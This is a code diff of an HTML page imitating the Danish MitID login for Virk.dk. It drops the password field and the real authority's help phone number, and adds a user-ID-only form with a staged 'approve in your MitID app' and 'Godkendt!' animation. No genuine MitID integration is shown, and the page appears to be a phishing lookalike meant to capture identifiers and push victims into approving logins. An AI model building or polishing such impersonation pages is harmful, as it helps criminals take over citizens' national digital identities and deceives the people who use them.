@@ -31,9 +31,10 @@
                 <div class="login-card-top">
                     <img src="assets/mitid-logo.svg" alt="MitID" class="mitid-login-logo">
                     <h1 class="login-title">Log ind med MitID</h1>
-                    <p class="login-subtitle">Brug MitID for at få adgang til Virk.dk</p>
+                    <p class="login-subtitle">Indtast dit Bruger-ID for at fortsætte</p>
                 </div>
 
+                <!-- Step 1: Bruger-ID input -->
                 <form class="login-form" id="loginForm">
                     <div class="form-field">
                         <label for="username" class="form-label">Bruger-ID</label>
@@ -51,38 +52,6 @@
                                 required
                             >
                         </div>
-                    </div>
-
-                    <div class="form-field">
-                        <label for="password" class="form-label">Adgangskode</label>
-                        <div class="input-wrapper">
-                            <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
-                                <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
-                            </svg>
-                            <input 
-                                type="password" 
-                                id="password" 
-                                class="form-input" 
-                                placeholder="Indtast din adgangskode"
-                                autocomplete="current-password"
-                                required
-                            >
-                            <button type="button" class="toggle-visibility" id="toggleVisibility" aria-label="Vis adgangskode">
-                                <svg class="eye-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
-                                    <circle cx="12" cy="12" r="3"/>
-                                </svg>
-                            </button>
-                        </div>
-                    </div>
-
-                    <div class="form-options">
-                        <label class="checkbox-wrapper">
-                            <input type="checkbox" id="rememberMe" class="form-checkbox">
-                            <span class="checkbox-label">Husk mig på denne enhed</span>
-                        </label>
-                        <a href="#" class="forgot-link">Glemt bruger-ID eller adgangskode?</a>
                     </div>
 
                     <button type="submit" class="btn-login" id="loginBtn">
@@ -109,7 +78,7 @@
 
             <!-- Help Sidebar -->
             <aside class="login-sidebar">
-                <h2 class="sidebar-title">Har du brug for hjælp?</h2>
+                <h2 class="sidebar-title">Sådan logger du ind</h2>
                 
                 <div class="sidebar-card">
                     <div class="sidebar-icon">
@@ -120,21 +89,21 @@
                         </svg>
                     </div>
                     <div class="sidebar-content">
-                        <h3>Sådan logger du ind</h3>
-                        <p>Du skal bruge dit MitID bruger-ID og din adgangskode.</p>
+                        <h3>Trin 1: Indtast Bruger-ID</h3>
+                        <p>Indtast dit MitID bruger-ID i feltet.</p>
                     </div>
                 </div>
 
                 <div class="sidebar-card">
                     <div class="sidebar-icon">
                         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                            <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>
+                            <rect x="5" y="2" width="14" height="20" rx="2" ry="2"/>
+                            <line x1="12" y1="18" x2="12.01" y2="18"/>
                         </svg>
                     </div>
                     <div class="sidebar-content">
-                        <h3>Kontakt Erhvervsstyrelsen</h3>
-                        <p>Ring til os på <strong>35 29 10 00</strong></p>
-                        <p>Mandag-fredag: 9:00-15:00</p>
+                        <h3>Trin 2: Godkend i appen</h3>
+                        <p>Åbn din MitID-app og godkend login.</p>
                     </div>
                 </div>
 
@@ -146,43 +115,68 @@
                         </svg>
                     </div>
                     <div class="sidebar-content">
-                        <h3>Har du ikke MitID?</h3>
-                        <p>Du kan få MitID hos Borgerservice i din kommune eller via din bank.</p>
+                        <h3>Sikkerhed</h3>
+                        <p>Din identitet beskyttes af MitID.</p>
                     </div>
                 </div>
             </aside>
         </div>
     </main>
 
-    <!-- Error Modal -->
-    <div class="modal-overlay" id="errorModal" style="display: none;">
-        <div class="modal-box">
-            <div class="modal-icon-wrapper">
-                <svg class="modal-warning-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                    <circle cx="12" cy="12" r="10"/>
-                    <line x1="12" y1="8" x2="12" y2="12"/>
-                    <line x1="12" y1="16" x2="12.01" y2="16"/>
-                </svg>
+    <!-- MitID Approval Overlay (hidden initially) -->
+    <div class="mitid-overlay" id="mitidOverlay" style="display: none;">
+        <div class="mitid-approval-card">
+            <div class="mitid-approval-header">
+                <img src="assets/mitid-logo.svg" alt="MitID" class="mitid-approval-logo">
             </div>
-            <h2 class="modal-title">Login mislykkedes</h2>
-            <p class="modal-message">Forkert bruger-ID eller adgangskode. Prøv venligst igen.</p>
-            <button class="btn-modal-close" id="modalClose">Prøv igen</button>
-        </div>
-    </div>
+            
+            <!-- Animation stage -->
+            <div class="mitid-animation-stage" id="animationStage">
+                <!-- Step 1: Spinner -->
+                <div class="mitid-step" id="stepConnecting">
+                    <div class="loading-spinner dark large"></div>
+                    <h3>Åbner MitID...</h3>
+                    <p>Forbindelse til MitID oprettes</p>
+                </div>
+                
+                <!-- Step 2: Phone icon with waiting -->
+                <div class="mitid-step" id="stepWaiting" style="display: none;">
+                    <div class="phone-animation">
+                        <svg class="phone-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <rect x="5" y="2" width="14" height="20" rx="2" ry="2"/>
+                            <line x1="12" y1="18" x2="12.01" y2="18"/>
+                        </svg>
+                        <div class="pulse-ring"></div>
+                    </div>
+                    <h3>Godkend i din MitID-app</h3>
+                    <p>Åbn appen på din telefon og godkend</p>
+                </div>
+                
+                <!-- Step 3: Checkmark (success) -->
+                <div class="mitid-step" id="stepSuccess" style="display: none;">
+                    <div class="success-animation">
+                        <svg class="success-check" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
+                            <polyline points="22 4 12 14.01 9 11.01"/>
+                        </svg>
+                    </div>
+                    <h3>Godkendt!</h3>
+                    <p>Du er nu logget ind</p>
+                </div>
+            </div>
 
-    <!-- Success Redirect Modal -->
-    <div class="modal-overlay" id="successModal" style="display: none;">
-        <div class="modal-box">
-            <div class="modal-icon-wrapper success">
-                <svg class="modal-success-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                    <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
-                    <polyline points="22 4 12 14.01 9 11.01"/>
-                </svg>
-            </div>
-            <h2 class="modal-title">Verificerer...</h2>
-            <p class="modal-message">Bekræfter dine oplysninger. Du bliver omdirigeret.</p>
-            <div class="modal-loading">
-                <div class="loading-spinner dark"></div>
+            <!-- Error message (shown on timeout) -->
+            <div class="mitid-error" id="mitidError" style="display: none;">
+                <div class="modal-icon-wrapper">
+                    <svg class="modal-warning-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <circle cx="12" cy="12" r="10"/>
+                        <line x1="12" y1="8" x2="12" y2="12"/>
+                        <line x1="12" y1="16" x2="12.01" y2="16"/>
+                    </svg>
+                </div>
+                <h3>Godkendelse mislykkedes</h3>
+                <p>Der opstod en fejl. Prøv igen.</p>
+                <button class="btn-modal-close" id="mitidRetry">Prøv igen</button>
             </div>
         </div>
     </div>
